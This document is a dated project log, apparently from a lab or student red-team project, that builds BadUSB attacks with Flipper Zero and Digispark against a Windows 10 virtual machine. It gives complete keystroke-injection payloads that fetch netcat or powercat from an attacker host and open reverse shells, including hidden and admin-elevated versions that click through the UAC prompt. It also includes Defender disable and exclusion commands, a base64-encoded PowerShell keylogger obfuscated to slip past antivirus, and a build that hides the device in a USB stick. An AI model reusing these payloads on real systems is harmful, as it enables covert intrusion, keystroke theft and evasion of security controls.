### 19.9.2023:
Demo for Reverse Shell done.   
[Demo](../../payloads/revshell_demo)   
[Demo in action](https://youtu.be/h5MMKu6TMxg)   

---
### 26.9.2023

Today i started to figure out a way to get a reverse shell in Windows 10, without user interaction.

**Sources i used for this experiment:**   

**Powershell/Windows Reverse Shells:**   
https://www.hackingarticles.in/powershell-for-pentester-windows-reverse-shell/  
https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/windows  
https://github.com/martinsohn/PowerShell-reverse-shell  
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell  

**Downloading files with Powershell:**   
https://superuser.com/questions/25538/how-to-download-files-from-command-line-in-windows-like-wget-or-curl  

**Rubber Ducky scripts:**   
https://gist.github.com/methanoliver/efebfe8f4008e167417d4ab96e5e3cac  

**BadUSB (and reverse shell) using Flipper Zero:**   
https://hackernoon.com/how-to-get-a-reverse-shell-on-macos-using-a-flipper-zero-as-a-badusb  
https://github.com/UNC0V3R3D/Flipper_Zero-BadUsb/blob/main/BadUsb-Collection/Windows_Badusb/FUN/FakeBluescreen/FakeBluescreen.txt  

Used Flipper Zero BadUSB, as the Digispark havent arrived yet, and the code itself should be compatible, or atleast easily converted to work with Digispark.   

Testing Setup:
Virtual Machines:
- Kali Linux
- Windows 10
Both are assigned to same internal network, for testing purposes.
Windows running with default protection settings On.

Flipper Zero, passthrough from Host to virtual Windows 10 machine.

Testing:   
A simplest example, combined from several other ready made scripts:
```bash
REM Description: BadUSB Reverse Shell
DELAY 500
GUI r
DELAY 400
STRING cmd
ENTER
DELAY 400
STRING powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.66.2/powercat.ps1');powercat -c 192.168.66.2 -p 9001 -e cmd"
DELAY 400
ENTER
```

Need webserver (serving the powercat.ps1 script)   

Example from attacker machine:   
```bash
┌──(kali🥦kali)-[~/testing]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ..
```

And listener, in the attacker machine (where the shell will be opened):   
```bash
┌──(kali🥦kali)-[~]
└─$ nc -nlvp 9001
listening on [any] 9001 ...
```

This works, BUT Windows - Virus Protection blocks it.

Temporary resolution:   
```bash
REM Description: BadUSB Reverse Shell
DELAY 500
GUI r
DELAY 400
STRING powershell
ENTER
DELAY 400
STRING Invoke-WebRequest -OutFile nc64.exe -Uri http://192.168.66.2/nc64.exe
DELAY 400
ENTER
DELAY 400
GUI r
DELAY 400
STRING cmd
ENTER
DELAY 400
STRING start /min nc64.exe 192.168.66.2 9001 -e powershell
DELAY 400
ENTER
```

So the attacker serves the nc64.exe (netcat).   
Victim downloads it, and while running it, it calls to the attacker and opens an interactive shell, all automatically when payload executed.

**Test successfull!**

TODO:
- Close Powershell.
- Hide cmd

= Run everything in the background   

[Demo in action:](https://youtu.be/1kqqIdBoKr0?si=59A7y56YvNoeQ5JB)

---
### 29.9.2023

So the Digisparks arrived!    
Lets get ready to rumbubummbbbmububleleelelee!

**Setting up the environment.**   
I follow this guide for Linux Mint, pretty strictly, as it had photos and stuff:   
https://startingelectronics.org/tutorials/arduino/digispark/digispark-linux-setup/

First thing to do was to get a Arduino IDE:

Im using:
```bash
~$ cat /etc/os-release 
PRETTY_NAME="Debian GNU/Linux 12 (bookworm)"
NAME="Debian GNU/Linux"
VERSION_ID="12"
VERSION="12 (bookworm)"
VERSION_CODENAME=bookworm
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"
~$ uname -a 
Linux parasite 6.1.0-12-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.52-1 (2023-09-07) x86_64 GNU/Linux
~$ 
```

So i downloaded the Linux .zip from here:   
https://www.arduino.cc/en/software

After downloading and extracting the content, i threw the folder to my special place, and linked the executable `arduino-ide` from the folder to another folder included in PATH.   
(So its easy to run from everywhere)    

Digispark itself, was identified by system:
```bash
Bus 001 Device 110: ID 16d0:0753 MCS Digistump DigiSpark
```

Tackling few minor problems/issues when uploading stuff to Digispark:   
https://github.com/micronucleus/micronucleus/issues/170   
http://digistump.com/board/index.php?topic=106.0   
digistump.com/wiki/digispark/tutorials/linuxtroubleshooting   
http://digistump.com/board/index.php/topic,1834.msg13109.html#msg13109   

Had to also install:    
`libusb-dev`    

Needed udev rules:
```bash
┌──(sicki🥦parasite)-[~]
└─$ cat /etc/udev/rules.d/49-micronucleus.rules 
SUBSYSTEMS=="usb", ATTRS{idVendor}=="16d0", ATTRS{idProduct}=="0753", MODE:="0666"
KERNEL=="ttyACM*", ATTRS{idVendor}=="16d0", ATTRS{idProduct}=="0753", MODE:="0666", ENV{ID_MM_DEVICE_IGNORE}="1"   
```

Applied the rules:
```bash
┌──(sicki🥦parasite)-[~]
└─$ sudo udevadm control --reload-rules && sudo udevadm trigger

```

Build the micronucleus and copied it under arduino tools

```bash
~/Projects$ git clone https://github.com/micronucleus/micronucleus.git
~/Projects$ cd micronucleus/commandline/
~/Projects/micronucleus/commandline$ make
Building library: library/micronucleus_lib.c...
gcc  -Ilibrary -O -g -D LINUX -c library/micronucleus_lib.c
Building library: library/littleWire_util.c...
gcc  -Ilibrary -O -g -D LINUX -c library/littleWire_util.c
Building command line tool: micronucleus...
gcc  -Ilibrary -O -g -D LINUX -o micronucleus micronucleus.c micronucleus_lib.o littleWire_util.o -static -L/usr/lib/x86_64-linux-gnu -lusb
rm -f *.o
~/Projects/micronucleus/commandline$ ls
49-micronucleus.rules  library   micronucleus    Readme
builds                 Makefile  micronucleus.c
~/Projects/micronucleus/commandline$ cp micronucleus ~/.arduino15/packages/digistump/tools/micronucleus/2.0a4/
```

So now i had an environment ready for development.   


**Digispark stuff**

I started with a simple Hello World and uploaded it to Digispark:   

![](notes_res/notes-.png)

That one didnt quite work. Found from the cheatsheet, that the keystrokes must be put, from right to left. Also the enter button got "stuck" so had to escape it with "0"   

Fixed, uploaded, plug in/out:

![](notes_res/notes-1.png)

**Worked like a charm**

So the Digispark, when plugged, goes in to some "programmable" mode, for X amount of seconds, and after that it goes in to "execute" mode.    
In that programmable mode, it looks like this:   
```bash
Bus 001 Device 059: ID 16d0:0753 MCS Digistump DigiSpark
```
So in order to upload, i had to first press upload in IDE, and then plug it in. And if not plugged out after upload, it executed the code.   
I searched that it uses the first seconds to load the bootloader and after that it executes whats uploaded.   

In execute mode, the ID changes:   
```bash
Bus 001 Device 060: ID 16c0:27db Van Ooijen Technische Informatica Keyboard
```

So, when wanting to program it in my Host, and executing the payloads in my virtual machine, i had to add the right device to my virtual machine's usb filters:
![](notes_res/notes-2.png)


Easiest way to do this, if not wanting to manually input all the fields:   
Write a simple payload, with lots of delay.    
For example:   
```ino
#include "DigiKeyboard.h"

void setup() {

}

void loop() {

DigiKeyboard.delay(10000);

}
```
Upload and let it run.   
While its running the delay, go to virtual machine's USB settings and use the "Add filter with all the fields, set to default..."

As in the picture, there can be seen both:  
- Programming mode
- Execute mode   
And only the execute mode is captured by virtual machine.   
**Profit**.

**TODO:**
- Reverse shell script from BadUSB to Digispark

---
### 29.9.2023 - continuation
 
*Digispark to real test.*

I started by trying the [digiQuack by CedArctic](https://cedarctic.github.io/digiQuack/) which converts rubber ducky payloads to compatible with Digispark.

Original payload, used with FlipperZero previously, as it was confirmed as working.  

It ended up like this:
```ino
#include "DigiKeyboard.h"

void setup() {}

void loop() {
	DigiKeyboard.sendKeyStroke(0);
	// Description: BadUSB Reverse Shell
	DigiKeyboard.delay(500);
	DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT,KEY_R);
	DigiKeyboard.delay(400);
	DigiKeyboard.print("powershell");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(400);
	DigiKeyboard.print("Invoke-WebRequest -OutFile nc64.exe -Uri http://192.168.66.2/nc64.exe");
	DigiKeyboard.delay(400);
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(400);
	DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT,KEY_R);
	DigiKeyboard.delay(400);
	DigiKeyboard.print("cmd");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(400);
	DigiKeyboard.print("start /min nc64.exe 192.168.66.2 9001 -e powershell");
	DigiKeyboard.delay(400);
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
}
```

Tried it of course as it is, as a test...   
Ended up with few problems.
1. Win+R wasn't working
2. Digispark seems to use US keyboard layout
	- So when trying to run that in a machine that uses, in my case, Scandinavian layout, there's plenty of "wrong" characters.
3. Delays work little bit differently, then with BadUSB = Too fast.
	- Might be due to my(MS) crappy Virtual Machine - Windows 10

**Tackled them:**
1. A tip from the cheatsheet:   
*DigiKeyboard.sendKeyStroke(KEY_R , MOD_GUI_LEFT);  
Windows Run window shortcut (WinKey+ R)*

So it seemed the order needs to be "backwards"   
Changed it, and it worked.

2. Workaround for now, was to change the victim device KB layout to US.
3. Increased the delay  

Payload:
```ino
#include "DigiKeyboard.h"

void setup() {}

void loop() {
// Description: BadUSB Reverse Shell
DigiKeyboard.delay(5000);
DigiKeyboard.sendKeyStroke(0);
DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
DigiKeyboard.delay(1000);
DigiKeyboard.print("powershell");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(1000);
DigiKeyboard.print("Invoke-WebRequest -OutFile nc64.exe -Uri http://192.168.66.2/nc64.exe");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(2000);
DigiKeyboard.print("exit");
DigiKeyboard.delay(1000);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(1000);
DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
DigiKeyboard.delay(1000);
DigiKeyboard.print("cmd");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(1000);
DigiKeyboard.print("start /min nc64.exe 192.168.66.2 9001 -e powershell");
DigiKeyboard.delay(1000);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(2000);
DigiKeyboard.print("exit");
DigiKeyboard.delay(1000);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
exit(0);
}
```

Confirmed and working like should.

**Profit!**

**TODO:**
Figure out something for the Scandinavian KB layout.

To read and study:   
https://github.com/digistump/DigistumpArduino/issues/46   
https://github.com/ArminJo/DigistumpArduino/blob/982824d0f638a0c567a125ae43d4d5632f65e76f/digistump-avr/libraries/DigisparkKeyboard/keylayouts.h#L41   
https://digistump.com/board/index.php?topic=2289.0   
https://github.com/ArminJo/DigistumpArduino   
https://github.com/SpenceKonde/ATTinyCore   

---
### 01.10.2023
*Tackle the keymappings*

After a long search, debug test drive etc...

This is the "main" file:   
https://github.com/digistump/DigistumpArduino/blob/master/digistump-avr/libraries/DigisparkKeyboard/DigiKeyboard.h   
Found in my enviroment ( Linux - Debian 12 | Arduino IDE 2.2.1 | Digistump AVR Boards 1.6.7) at:   
```bash
~/.arduino15/packages/digistump/hardware/avr/1.6.7/libraries/DigisparkKeyboard/
```

Next:   
[Found a German layout. ](https://github.com/adnan-alhomssi/DigistumpArduinoDe) and the file itself:   
https://github.com/adnan-alhomssi/DigistumpArduinoDe/blob/master/digistump-avr/libraries/DigisparkKeyboard/DigiKeyboardDe.h   

I took the mentioned file, and edited at least most of the keys, according to Scandinavian layout, and came out with this:   
[DigiKeyboardCustom.h](notes_res/DigiKeyboardCustom.h)   

Note, that file must be in, in my case atleast:   
```bash
~/.arduino15/packages/digistump/hardware/avr/1.6.7/libraries/DigisparkKeyboard/
```

Ran a few tests, while the final test, were the special characters that are tested:

```ino
#include <DigiKeyboardCustom.h>

void setup() {}

void loop() {

DigiKeyboard.delay(5000);
DigiKeyboardCustom.print("1234567890+");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(500);
DigiKeyboardCustom.print("!\"#%&/()=?");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(500);
DigiKeyboardCustom.print("@£${[]}");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(500);
DigiKeyboard.delay(500);
DigiKeyboardCustom.print("><|;:_,.-");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(500);
DigiKeyboardCustom.print("*");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(500);
DigiKeyboardCustom.print("~ ");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(500);
DigiKeyboardCustom.print("\'");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(500);
DigiKeyboardCustom.print("^ ");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.sendKeyStroke(0);
exit(0);
}
```

Came out like this, and its like its supposed to be!   
```
1234567890+
!"#%&/()=?
@${[]}
><|;:_,.-
*
~
'
^
```

**Note to the payload:**   
*Some characters needed to have backslash, for escaping!*
For example to print `'` it needs to be `\'`   

**Also NOTE!**
Not yet fully tested with the previous reverse shell payload!

---
### 07.10.2023

Started yesterday to figure out the Scandinavian characters....   
After several hours of printing character and debuging sh\*t, i finally managed to get the custom keyboard library to support å ö ä and all the other special characters in Finnish keyboard layout:    

![](notes_res/notes-%201.png)

**Profit!**

Final version:   
[DigiKeyboardFi](https://github.com/therealhalonen/DigiKeyboardFi)

Edited the Reverse Shell payload according to those new keyboard stuffs:   
[rev_shell_digispark.ino](../../payloads/revshell_digispark/revshell_digispark.ino)

---
### 08.10.2023
*Physical attacking device*    

Today i wanted to have the Digispark inside a USB thumb drive.   
I took a usb thumb drive, disassembled it and tested the fit...
It didnt fit:       

![](notes_res/1.jpg)

I marked the place, and carved the sides a bit:     
![](notes_res/2.jpg)

And now it fitted:   
![](notes_res/3.jpg)

Soldered a USB Male connector, which i took out from an old cable, to Digispark with matching the pins 1:1:   
![](notes_res/4.jpg)   

Put it in place, and make it stick with a some hot glue:   
![](notes_res/5.jpg)   

Put it all together, and as the sides had to be carved open, i stuck some tape to cover them, for now, until i find a better, stealth solution:   
![](notes_res/6.jpg)


Plugged it in:   
![](notes_res/7.jpg)

And working like a charm:   
```bash
┌──(sicki🥦parasite)-[~]
└─$ lsusb | grep 16 
Bus 001 Device 061: ID 16d0:0753 MCS Digistump DigiSpark

# After the bootloader mode
# -> 

┌──(sicki🥦parasite)-[~]
└─$ lsusb | grep 16
Bus 001 Device 062: ID 16c0:27db Van Ooijen Technische Informatica Keyboard
```

**Profit!**

---
### 10.10.2023

*Disabling security stuff from Windows, with Digispark:*

Using again and still:    
- Debian 12 Host
- Windows 10 virtualbox VM

Went pretty straight forward to search Powershell commands, as im not experienced with PS, at all...

https://www.windowscentral.com/how-disable-real-time-protection-microsoft-defender-antivirus

```powershell
Set-MpPreference -DisableRealtimeMonitoring $false
```

Lets see what happens:

![](notes_res/notes-%202.png)

Not working... Ok whatever...   

[https://wirediver.com/disable-windows-defender-in-powershell/](https://wirediver.com/disable-windows-defender-in-powershell/ "https://wirediver.com/disable-windows-defender-in-powershell/")

```powershell
PS C:\Users\antha> Get-MpComputerStatus | select IsTamperProtected

IsTamperProtected
-----------------
             True
```


https://support.microsoft.com/en-us/windows/prevent-changes-to-security-settings-with-tamper-protection-31d51aaa-645d-408e-6ce7-8d7f8e593f87

```bash
Set-MpPreference -DisableRealtimeMonitoring $true
```
This works if tampering protection is disabled, and running Powershell as Admin.

Searched quite alot of stuff...   
Some mentioned methods required regedit, reboots etc tinkering etc, so i decided to try Bypassing instead of Disabling.   

https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/defense-evasion/disable-defender

```powershell
Add-MpPreference -ExclusionPath "C:\Windows\Temp"
```


To check:
```powershell
Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
```

**So far there has been no need to disable or circle around the Defender, so the previously mentioned methods will serve as notes. Coming back to this and continuing from here, when it becomes necessary, most likely later on.**

---
### 12.10.2023
*Improving the Reverse Shell payload*

As the original demo we did, was quite slow and after the results of the [ransomware payload improvements](https://github.com/therealhalonen/PhishSticks/blob/04ffbcb30b5a5cad4d38c54e4ceb975d5b421ff8/notes/rajala/notes.md#11102023) I decided to give the Reverse Shell a little bit improvement too.

Original:    
https://github.com/therealhalonen/PhishSticks/blob/master/payloads/revshell_digispark/revshell_digispark.ino   

To break it down:   
- It first opens the "Run"
- Types `powershell` end presses Enter
	- In/From Powershell, it downloaded the nc64.exe, from attacker to victim
	- Exits
- Opens "Run" again.
	- Types `cmd` and presses Enter
		- Starts the nc64.exe minimized = Calls the attacker.
Reverse Shell is opened, and the nc64.exe is/was showing in the quicklaunch bar or whatever it is in Windows, thing in the bottom.

I got an idea, as "everything is possible" mindset running, that i want to do it with only:
- Open "Run"
	- Run a oneliner while keeping everything hidden.

Sounds cool...

Well at this point we had already, as mentioned in the beginning, the randomware payload tested and running hidden, i edited the revshell payload, and tested it manually:

The oneliner:
```bash
powershell -w hidden -c "Invoke-WebRequest -OutFile $env:UserProfile/nc64.exe -Uri http://192.168.66.2/nc64.exe ; Start-Process \"$env:UserProfile/nc64.exe\" -ArgumentList '192.168.66.2', '9001', '-e', 'powershell' -NoNewWindow" 
```

Explanations:
```bash
-w hidden #Window mode hidden
-c # a command, and in this case, 2 commands, one after another is successfull
# Download the file to specific location
# Run the file from specific location
# No workdir needed here
- NoNewWindow # Doesnt open up a separate cmd window for nc64.exe execution. 
```

The command is short enough to fit the Windows Run, as there are some length limitations, noticed in previous individual testings:

![](notes_res/notes-%203.png)

Ran superfast and got a reverse shell:

![](notes_res/notes-%204.png)

Payload:    
[digispark_revshell_v2](https://github.com/therealhalonen/PhishSticks/blob/master/payloads/revshell_digispark/digispark_revshell_v2/digispark_revshell_v2.ino)   
*Another thing, to make it maybe more simple, is to make it download the nc64.exe from the web, instead of serving it from the attacker machine, but thats at this point, only something to think about, and why.*   

*That would be as easy as just changing the url to:*  
*https://github.com/int0x33/nc.exe/raw/master/nc64.exe*

*And possible shortening it with the help of some known services.*

*Credits to:*   
*https://github.com/int0x33*

**But now as it works as it should, theres no need to tinker it anymore.**

Another "topic" related and natural continuation here, as the whole project started as an *experimental thing*, is to take at least a quick look to privilege escalation.

*What ive learned the most, from the beginning to this point, is mostly about Windows and Powershell, as i have quite a long history in daily Linux usage.*

It seemed that the `-Verb -RunAs` will make the Powershell run with Admin privileges. Of course, as we are testing everything with Windows 10 and all security as default, it asks a confirmation.   
These could be quite easily, not bypassed, but "accepted" with the help of Digispark.  
**Problem comes, that it seems you cannot run `-Verb -RunAs` and `-NoNewWindow` together(?)**

Dirty workaround, to get reverse shell with admin privileges:   
[digispark_revshell_v2_5.ino](https://github.com/therealhalonen/PhishSticks/blob/master/payloads/revshell_digispark/digispark_revshell_v2_5/digispark_revshell_v2_5.ino)   
```bash
#include <DigiKeyboardFi.h>

void setup() {}

void loop() {

// Description: BadUSB Reverse Shell v2.5
DigiKeyboard.delay(1000);
DigiKeyboard.sendKeyStroke(0);
DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
DigiKeyboard.delay(500);
DigiKeyboardFi.print("powershell -w hidden -c \"Invoke-WebRequest -OutFile $env:UserProfile/nc64.exe -Uri http://192.168.66.2/nc64.exe ; Start-Process -FilePath $env:UserProfile/nc64.exe -ArgumentList '192.168.66.2', '9001', '-e', 'powershell' -Verb RunAs");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(3000);
DigiKeyboard.sendKeyStroke(43); // 43=TAB
DigiKeyboard.sendKeyStroke(43); // 43=TAB
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(1000);
DigiKeyboard.sendKeyStroke(KEY_M,MOD_GUI_LEFT);
DigiKeyboard.delay(500);
exit(0);
}
```

Outcome:   
![](notes_res/notes-%205.png)

Checking from attacker machine, if got Admin privileges for the session:
![](notes_res/notes-%206.png)

Explanation for checking command:   
https://superuser.com/questions/749243/detect-if-powershell-is-running-as-administrator   
With specific details:   
https://superuser.com/a/749259

Comparison to regular user session in Powershell:   

![](notes_res/notes-%207.png)

**BOOM!**

---
### 13.10.2023
*Vagrant*

I have been using a Windows 10 virtual machine, one that i have set up for a while now, for testing purposes:   

- Edition: Windows 10 Pro
- Version: 22H2
- OS build: 19045.3570

Everything (security wise) with default settings.
User has privileges to run as Administrator, with confirmation prompt of course.

I started to test a vagrant machine, recommended by [Miljonka](https://github.com/miljonka?tab=repositories)

Box:   
https://app.vagrantup.com/gusztavvargadr/boxes/windows-10   

- Edition: WIndows 10 Enterprise Evaluation
- Version: 22H2
- OS build: 19045.3324 (As is)
	- OS build: 19045.3570 (After running all updates)

As running it, i noticed that the UAC was disabled, but Defender, Security etc setting seemed to be ok according to defaults.

I made a Vagrantfile, to have everything automatically set up for testings:   
[Vagrantfile](notes_res/Vagrantfile)

Settings include:
- Assigns the device to my personal, virtual, internal network with static ip.
- Enables USB 3.0 controller and add filter for Digispark to have it automatically connected.
- Provisioning:
	- Changes keyboard language to Finnish
	- Enables UAC

After some test runs, all working like should.  

*This was partly outside the project scope, but makes things easier to maintain and setup, at least for testing phases.    
Most likely the final runs of the payloads, will be ran in specific fresh installation of Windows 10.*

---
### 24.10.2023
*Keylogger and obfuscating payloads*

Next up is the keylogger, which most likely is the most complicated one to implement.
Things to consider:
- Writing the script or downloading it.
- Execution triggers Defender.
- What to do with the logged keys.

I started continuing to work with the Defender bypassing.

The Keylogger, Powershell script, ready made, and working IF REALTIME PROTECTION IS DISABLED
Source:   
https://gist.githubusercontent.com/dasgoll/7ca1c059dd3b3fbc7277/raw/e4e3a530589dac67ab6c4c2428ea90de93b86018/gistfile1.txt

**Obfuscate:**    
Im doing these obfuscations in my attacker machine (Kali Linux) and serving them via python webserver and using the victim (Windows 10) to download them and run.

First i decided to go with the Base64 encoding:

Base64 Encoded script:
```bash
I3JlcXVpcmVzIC1WZXJzaW9uIDIKZnVuY3Rpb24gU3RhcnQtS2V5TG9nZ2VyKCRQYXRoPSIkZW52
OnRlbXBca2V5bG9nZ2VyLnR4dCIpIAp7CiAgIyBTaWduYXR1cmVzIGZvciBBUEkgQ2FsbHMKICAk
c2lnbmF0dXJlcyA9IEAnCltEbGxJbXBvcnQoInVzZXIzMi5kbGwiLCBDaGFyU2V0PUNoYXJTZXQu
QXV0bywgRXhhY3RTcGVsbGluZz10cnVlKV0gCnB1YmxpYyBzdGF0aWMgZXh0ZXJuIHNob3J0IEdl
dEFzeW5jS2V5U3RhdGUoaW50IHZpcnR1YWxLZXlDb2RlKTsgCltEbGxJbXBvcnQoInVzZXIzMi5k
bGwiLCBDaGFyU2V0PUNoYXJTZXQuQXV0byldCnB1YmxpYyBzdGF0aWMgZXh0ZXJuIGludCBHZXRL
ZXlib2FyZFN0YXRlKGJ5dGVbXSBrZXlzdGF0ZSk7CltEbGxJbXBvcnQoInVzZXIzMi5kbGwiLCBD
aGFyU2V0PUNoYXJTZXQuQXV0byldCnB1YmxpYyBzdGF0aWMgZXh0ZXJuIGludCBNYXBWaXJ0dWFs
S2V5KHVpbnQgdUNvZGUsIGludCB1TWFwVHlwZSk7CltEbGxJbXBvcnQoInVzZXIzMi5kbGwiLCBD
aGFyU2V0PUNoYXJTZXQuQXV0byldCnB1YmxpYyBzdGF0aWMgZXh0ZXJuIGludCBUb1VuaWNvZGUo
dWludCB3VmlydEtleSwgdWludCB3U2NhbkNvZGUsIGJ5dGVbXSBscGtleXN0YXRlLCBTeXN0ZW0u
VGV4dC5TdHJpbmdCdWlsZGVyIHB3c3pCdWZmLCBpbnQgY2NoQnVmZiwgdWludCB3RmxhZ3MpOwon
QAoKICAjIGxvYWQgc2lnbmF0dXJlcyBhbmQgbWFrZSBtZW1iZXJzIGF2YWlsYWJsZQogICRBUEkg
PSBBZGQtVHlwZSAtTWVtYmVyRGVmaW5pdGlvbiAkc2lnbmF0dXJlcyAtTmFtZSAnV2luMzInIC1O
YW1lc3BhY2UgQVBJIC1QYXNzVGhydQogICAgCiAgIyBjcmVhdGUgb3V0cHV0IGZpbGUKICAkbnVs
bCA9IE5ldy1JdGVtIC1QYXRoICRQYXRoIC1JdGVtVHlwZSBGaWxlIC1Gb3JjZQoKICB0cnkKICB7
CiAgICBXcml0ZS1Ib3N0ICdSZWNvcmRpbmcga2V5IHByZXNzZXMuIFByZXNzIENUUkwrQyB0byBz
ZWUgcmVzdWx0cy4nIC1Gb3JlZ3JvdW5kQ29sb3IgUmVkCgogICAgIyBjcmVhdGUgZW5kbGVzcyBs
b29wLiBXaGVuIHVzZXIgcHJlc3NlcyBDVFJMK0MsIGZpbmFsbHktYmxvY2sKICAgICMgZXhlY3V0
ZXMgYW5kIHNob3dzIHRoZSBjb2xsZWN0ZWQga2V5IHByZXNzZXMKICAgIHdoaWxlICgkdHJ1ZSkg
ewogICAgICBTdGFydC1TbGVlcCAtTWlsbGlzZWNvbmRzIDQwCiAgICAgIAogICAgICAjIHNjYW4g
YWxsIEFTQ0lJIGNvZGVzIGFib3ZlIDgKICAgICAgZm9yICgkYXNjaWkgPSA5OyAkYXNjaWkgLWxl
IDI1NDsgJGFzY2lpKyspIHsKICAgICAgICAjIGdldCBjdXJyZW50IGtleSBzdGF0ZQogICAgICAg
ICRzdGF0ZSA9ICRBUEk6OkdldEFzeW5jS2V5U3RhdGUoJGFzY2lpKQoKICAgICAgICAjIGlzIGtl
eSBwcmVzc2VkPwogICAgICAgIGlmICgkc3RhdGUgLWVxIC0zMjc2NykgewogICAgICAgICAgJG51
bGwgPSBbY29uc29sZV06OkNhcHNMb2NrCgogICAgICAgICAgIyB0cmFuc2xhdGUgc2NhbiBjb2Rl
IHRvIHJlYWwgY29kZQogICAgICAgICAgJHZpcnR1YWxLZXkgPSAkQVBJOjpNYXBWaXJ0dWFsS2V5
KCRhc2NpaSwgMykKCiAgICAgICAgICAjIGdldCBrZXlib2FyZCBzdGF0ZSBmb3IgdmlydHVhbCBr
ZXlzCiAgICAgICAgICAka2JzdGF0ZSA9IE5ldy1PYmplY3QgQnl0ZVtdIDI1NgogICAgICAgICAg
JGNoZWNra2JzdGF0ZSA9ICRBUEk6OkdldEtleWJvYXJkU3RhdGUoJGtic3RhdGUpCgogICAgICAg
ICAgIyBwcmVwYXJlIGEgU3RyaW5nQnVpbGRlciB0byByZWNlaXZlIGlucHV0IGtleQogICAgICAg
ICAgJG15Y2hhciA9IE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5UZXh0LlN0cmluZ0J1aWxk
ZXIKCiAgICAgICAgICAjIHRyYW5zbGF0ZSB2aXJ0dWFsIGtleQogICAgICAgICAgJHN1Y2Nlc3Mg
PSAkQVBJOjpUb1VuaWNvZGUoJGFzY2lpLCAkdmlydHVhbEtleSwgJGtic3RhdGUsICRteWNoYXIs
ICRteWNoYXIuQ2FwYWNpdHksIDApCgogICAgICAgICAgaWYgKCRzdWNjZXNzKSAKICAgICAgICAg
IHsKICAgICAgICAgICAgIyBhZGQga2V5IHRvIGxvZ2dlciBmaWxlCiAgICAgICAgICAgIFtTeXN0
ZW0uSU8uRmlsZV06OkFwcGVuZEFsbFRleHQoJFBhdGgsICRteWNoYXIsIFtTeXN0ZW0uVGV4dC5F
bmNvZGluZ106OlVuaWNvZGUpIAogICAgICAgICAgfQogICAgICAgIH0KICAgICAgfQogICAgfQog
IH0KICBmaW5hbGx5CiAgewogICAgIyBvcGVuIGxvZ2dlciBmaWxlIGluIE5vdGVwYWQKICAgIG5v
dGVwYWQgJFBhdGgKICB9Cn0KCiMgcmVjb3JkcyBhbGwga2V5IHByZXNzZXMgdW50aWwgc2NyaXB0
IGlzIGFib3J0ZWQgYnkgcHJlc3NpbmcgQ1RSTCtDCiMgd2lsbCB0aGVuIG9wZW4gdGhlIGZpbGUg
d2l0aCBjb2xsZWN0ZWQga2V5IGNvZGVzClN0YXJ0LUtleUxvZ2dlcgo=
```

Didnt work, got blocked.

![](notes_res/notes-%208.png)

What came to my mind, while reading here and there everywhere, that i first remove all the unneccessary comments and mentions of "key logging" from the script, and came up with this:    
[helper.ps1](notes_res/helper.ps1)

Also changed the function to "Start-Helper" instead of Key logger.

Also while studying the obfuscations, i bumped in to this:   
https://github.com/JoelGMSec/Invoke-Stealth    
And the guide/help:   
https://darkbyte.net/ofuscando-scripts-de-powershell-con-invoke-stealth/

I made a little testing lab thing to my Kali:   
![](notes_res/notes-%209.png)

So:   
1. I used the Invoke-Stealth in powershell to obfuscate the `maltsu.ps1` with ReverseB64
2. `maltsu.ps1` obscuscated, so that it uses a variable, which is the encoded script and then it decodes that on the fly.
3. Webserver, serving the payload (`maltsu.ps1`)

Full obfuscated payload:    
[maltsu.ps1](notes_res/maltsu.ps1)

Execution from Victim:    
![](notes_res/notes-%2010.png)

**And Profit!**

![](notes_res/notes-%2011.png)

1. Download the payload from attacker and execute it.
2. Go to a browser and type something.
3. In a Temp directory, a file named `help` is created
4. File contains the logged keys!

**To put everything to Digispark compatible and as Stealth as possible**

Again good old WindowStyle Hidden:    
[digispark_keylog.ino](https://github.com/therealhalonen/PhishSticks/blob/master/payloads/digispark_keylog/digispark_keylog.ino)

All ran on the background and log file will be found in the folder:
```bash
$env:UserProfile\AppData\Local\Temp
```

Inside file named:
```bash
help
```

**Note: To stop the logging, a reboot is needed**

We wanted to try few different kind of approaches to keylogging, and [miljonka](https://github.com/therealhalonen/PhishSticks/blob/master/notes/rajala/notes.md#24102023) came up with Python based one, which he converted to .exe and ran flawlessly bypassing the Windows security!

